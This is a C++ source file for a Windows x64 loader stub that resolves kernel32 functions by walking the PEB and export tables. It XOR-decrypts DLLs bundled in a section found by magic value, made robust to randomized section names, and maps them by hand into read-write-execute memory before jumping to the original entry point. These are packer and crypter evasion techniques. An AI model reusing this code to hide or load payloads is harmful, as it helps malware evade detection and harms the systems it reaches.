#include <intrin.h>
#include <stddef.h>

typedef unsigned char      u8;
typedef unsigned short     u16;
typedef unsigned int       u32;
typedef unsigned long long u64;
typedef long long          i64;
typedef void*              ptr;

#pragma pack(push, 1)
struct DOS_HDR   { u16 e_magic; u8 pad[58]; u32 e_lfanew; };
struct FILE_HDR  { u32 sig; u16 Machine, NumSec; u32 TS, SymOff, NumSym; u16 OptSz, Chars; };
struct DATA_DIR  { u32 RVA, Size; };
struct OPT_HDR64 {
    u16 Magic;
    u8  MajLnk, MinLnk;
    u32 SzCode, SzInit, SzUninit;
    u32 AddressOfEntryPoint;
    u32 BaseOfCode;
    u64 ImageBase;
    u32 SecAlign, FileAlign;
    u16 MajOS, MinOS, MajImg, MinImg, MajSub, MinSub;
    u32 Win32Ver;
    u32 SizeOfImage, SizeOfHeaders;
    u32 CheckSum;
    u16 Subsystem, DllChars;
    u64 SzStackRes, SzStackCom, SzHeapRes, SzHeapCom;
    u32 LoaderFlags;
    u32 NumDirs;
    DATA_DIR Dirs[16];
};
struct NT_HDR64   { FILE_HDR File; OPT_HDR64 Opt; };
struct SEC_HDR    { u8 Name[8]; u32 VirtSz, VirtAddr, RawSz, RawAddr; u8 pad[12]; u32 Chars; };
struct IMP_DESC   { u32 OrigFirst, TS, FwdChain, Name, First; };
struct IBN        { u16 Hint; char Name[1]; };
struct BASE_RELOC { u32 VirtAddr, SzBlock; };
struct DLL_SLOT   { u32 offset; u32 size; }; // bit 31 of size = manual mode: stub skips loading
struct BUNDLE_HDR {
    u32      magic;
    u32      oep_rva;
    u32      dll_count;
    u32      xor_key;
    DLL_SLOT slots[16];
};
#pragma pack(pop)

struct LIST_ENT { LIST_ENT* Flink; LIST_ENT* Blink; };
struct LDR_ENT {
    LIST_ENT InLoad, InMem, InInit;
    ptr DllBase, EntryPoint;
    u32 SizeOfImage; u8 pad2[4];
    struct { u16 Len, MaxLen; u8 pad_[4]; wchar_t* Buf; } FullName, BaseName;
};
struct PEB_LDR { u8 pad[8]; ptr pad2; LIST_ENT InLoad, InMem, InInit; };
struct PEB     { u8 pad[16]; ptr ImageBase; PEB_LDR* Ldr; };

typedef ptr (__stdcall* FN_VA) (ptr, u64, u32, u32);
typedef int (__stdcall* FN_VP) (ptr, u64, u32, u32*);
typedef ptr (__stdcall* FN_LL) (const char*);
typedef ptr (__stdcall* FN_GPA)(ptr, const char*);
typedef int (__stdcall* FN_DM) (ptr, u32, ptr);

static int wicmp(const wchar_t* a, const char* b) {
    while (*a && *b) {
        wchar_t ca = (*a >= L'A' && *a <= L'Z') ? *a+32 : *a;
        char    cb = (*b >= 'A'  && *b <= 'Z' ) ? *b+32 : *b;
        if (ca != cb) return 1;
        a++; b++;
    }
    return (*a || *b) ? 1 : 0;
}

static ptr find_module(const char* name) {
    PEB* peb = (PEB*)__readgsqword(0x60);
    LIST_ENT* head = &peb->Ldr->InMem;
    LIST_ENT* cur  = head->Flink;
    while (cur != head) {
        LDR_ENT* e = (LDR_ENT*)((u8*)cur - offsetof(LDR_ENT, InMem));
        if (e->BaseName.Buf && !wicmp(e->BaseName.Buf, name)) return e->DllBase;
        cur = cur->Flink;
    }
    return nullptr;
}

static ptr get_export(ptr base, const char* name) {
    u8* b = (u8*)base;
    DOS_HDR*  dos = (DOS_HDR*)b;
    NT_HDR64* nt  = (NT_HDR64*)(b + dos->e_lfanew);
    u32 erva = nt->Opt.Dirs[0].RVA;
    if (!erva) return nullptr;
    struct ED { u32 Fl,TS,Ver,Name,Base,NF,NN,AF,AN,AO; };
    ED* ed    = (ED*)(b + erva);
    u32* names= (u32*)(b + ed->AN);
    u16* ords = (u16*)(b + ed->AO);
    u32* funcs= (u32*)(b + ed->AF);
    for (u32 i = 0; i < ed->NN; i++) {
        const char* n = (const char*)(b + names[i]);
        const char* m = name;
        while (*n && *n == *m) { n++; m++; }
        if (!*n && !*m) return (ptr)(b + funcs[ords[i]]);
    }
    return nullptr;
}

static void load_dll(u8* data, FN_VA va, FN_VP vp, FN_LL ll, FN_GPA gpa) {
    DOS_HDR*  dos = (DOS_HDR*)data;
    NT_HDR64* nt  = (NT_HDR64*)(data + dos->e_lfanew);

    u8* base = (u8*)va((ptr)nt->Opt.ImageBase, nt->Opt.SizeOfImage, 0x3000, 0x40);
    if (!base) base = (u8*)va(nullptr, nt->Opt.SizeOfImage, 0x3000, 0x40);
    if (!base) return;

    for (u32 i = 0; i < nt->Opt.SizeOfHeaders; i++) base[i] = data[i];

    SEC_HDR* sec = (SEC_HDR*)((u8*)nt + sizeof(FILE_HDR) + nt->File.OptSz);
    for (u16 s = 0; s < nt->File.NumSec; s++) {
        u8* dst = base + sec[s].VirtAddr;
        u8* src = data + sec[s].RawAddr;
        for (u32 i = 0; i < sec[s].RawSz; i++) dst[i] = src[i];
    }

    i64 delta = (i64)(base - (u8*)nt->Opt.ImageBase);
    DATA_DIR& rd = nt->Opt.Dirs[5];
    if (delta && rd.RVA) {
        u8* r = base + rd.RVA, *re = r + rd.Size;
        while (r < re) {
            BASE_RELOC* blk = (BASE_RELOC*)r;
            if (!blk->SzBlock) break;
            u32 cnt = (blk->SzBlock - 8) / 2;
            u16* ent = (u16*)(r + 8);
            for (u32 i = 0; i < cnt; i++)
                if ((ent[i] >> 12) == 10)
                    *(u64*)(base + blk->VirtAddr + (ent[i] & 0xFFF)) += (u64)delta;
            r += blk->SzBlock;
        }
    }

    DATA_DIR& id = nt->Opt.Dirs[1];
    if (id.RVA) {
        IMP_DESC* imp = (IMP_DESC*)(base + id.RVA);
        for (; imp->Name; imp++) {
            ptr hmod = find_module((char*)(base + imp->Name));
            if (!hmod) hmod = ll((char*)(base + imp->Name));
            if (!hmod) continue;
            u64* iat  = (u64*)(base + imp->First);
            u64* orig = (u64*)(base + (imp->OrigFirst ? imp->OrigFirst : imp->First));
            for (; *orig; orig++, iat++) {
                ptr fn = (*orig & (1ULL<<63))
                    ? gpa(hmod, (const char*)(*orig & 0xFFFF))
                    : gpa(hmod, ((IBN*)(base + (*orig & 0x7FFFFFFF)))->Name);
                if (fn) *iat = (u64)fn;
            }
        }
    }

    for (u16 s = 0; s < nt->File.NumSec; s++) {
        u32 ch = sec[s].Chars;
        bool x = (ch & 0x20000000) != 0;
        bool w = (ch & 0x80000000) != 0;
        bool r2= (ch & 0x40000000) != 0;
        u32 prot = x && w ? 0x40 : x && r2 ? 0x20 : x ? 0x10 : w ? 0x04 : 0x02;
        u32 old; vp(base + sec[s].VirtAddr, sec[s].VirtSz ? sec[s].VirtSz : sec[s].RawSz, prot, &old);
    }

    if (nt->Opt.AddressOfEntryPoint) {
        FN_DM dm = (FN_DM)(base + nt->Opt.AddressOfEntryPoint);
        dm(base, 1, nullptr);
    }
}

extern "C" __declspec(noinline)
void stub_main() {
    PEB* peb      = (PEB*)__readgsqword(0x60);
    u8*  img_base = (u8*)peb->ImageBase;

    ptr k32 = find_module("kernel32.dll");
    if (!k32) return;

    FN_VA  va  = (FN_VA) get_export(k32, "VirtualAlloc");
    FN_VP  vp  = (FN_VP) get_export(k32, "VirtualProtect");
    FN_LL  ll  = (FN_LL) get_export(k32, "LoadLibraryA");
    FN_GPA gpa = (FN_GPA)get_export(k32, "GetProcAddress");
    if (!va || !vp || !ll || !gpa) return;

    DOS_HDR*  dos = (DOS_HDR*)img_base;
    NT_HDR64* nt  = (NT_HDR64*)(img_base + dos->e_lfanew);
    SEC_HDR*  sec = (SEC_HDR*)((u8*)nt + sizeof(FILE_HDR) + nt->File.OptSz);

    // Find .bndl section by magic instead of name so section name randomization works
    u8* bndl = nullptr;
    for (u16 i = 0; i < nt->File.NumSec; i++) {
        u8* candidate = img_base + sec[i].VirtAddr;
        if (*(u32*)candidate == 0x4C444E42u) {
            bndl = candidate;
            break;
        }
    }

    u32 oep_rva = 0;

    if (bndl) {
        BUNDLE_HDR* hdr = (BUNDLE_HDR*)bndl;
        oep_rva = hdr->oep_rva;
        for (u32 i = 0; i < hdr->dll_count && i < 16; i++) {
            u32 raw_size = hdr->slots[i].size;
            if (raw_size & 0x80000000u) continue; // bit 31: manual mode, skip
            if (!raw_size) continue;

            u8* dll_data = bndl + hdr->slots[i].offset;
            u8* load_src = dll_data;
            u8* tmp      = nullptr;

            if (hdr->xor_key) {
                // Decrypt into a temporary RW buffer before mapping
                tmp = (u8*)va(nullptr, raw_size, 0x3000, 0x04);
                if (tmp) {
                    for (u32 j = 0; j < raw_size; j++)
                        tmp[j] = dll_data[j] ^ ((hdr->xor_key >> ((j & 3) * 8)) & 0xFF);
                    load_src = tmp;
                }
            }

            load_dll(load_src, va, vp, ll, gpa);
        }
    }

    if (!oep_rva)
        oep_rva = ((NT_HDR64*)(img_base + ((DOS_HDR*)img_base)->e_lfanew))->Opt.AddressOfEntryPoint;

    ((void(*)())(img_base + oep_rva))();
}
